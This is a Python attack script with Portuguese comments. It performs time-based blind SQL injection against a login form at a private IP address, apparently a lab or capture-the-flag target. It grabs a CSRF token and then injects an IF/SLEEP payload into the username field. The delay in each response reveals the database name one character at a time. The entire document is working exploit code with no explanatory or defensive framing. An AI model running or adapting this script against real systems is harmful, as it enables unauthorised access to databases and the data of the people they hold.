import requests
import time
import string
import re
from bs4 import BeautifulSoup

# Nova URL do alvo
base_url = "http://172.16.3.96"
login_url = f"{base_url}"
delay_threshold = 4
charset = string.ascii_lowercase + string.digits + "_"

session = requests.Session()

def get_csrf_token():
    try:
        response = session.get(login_url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        token = soup.find('input', {'name': '_token'})['value']
        return token
    except Exception as e:
        print(f"[!] Erro ao obter CSRF token: {e}")
        return None

def test_payload(payload):
    token = get_csrf_token()
    if not token:
        return False
    data = {
        "_token": token,
        "username": payload,
        "password": "qualquercoisa"
    }
    try:
        start = time.time()
        r = session.post(login_url, data=data, timeout=10)
        elapsed = time.time() - start
        return elapsed >= delay_threshold
    except requests.exceptions.RequestException as e:
        print(f"[!] Erro de conexão: {e}")
        return False

def extract_database_name(max_length=20):
    print("[*] Iniciando extração do nome do banco com LIKE...")
    prefix = ""
    for pos in range(1, max_length + 1):
        found = False
        for c in charset:
            guess = prefix + c
            payload = f"admin' OR IF(database() LIKE '{guess}%', SLEEP(5), 0)-- -"
            if test_payload(payload):
                prefix += c
                print(f"[+] Letra {pos}: {c} (prefixo atual: {prefix})")
                found = True
                break
        if not found:
            print("[*] Fim da string.")
            break
    return prefix

if __name__ == "__main__":
    db_name = extract_database_name()
    print(f"[✓] Nome do banco de dados: {db_name}")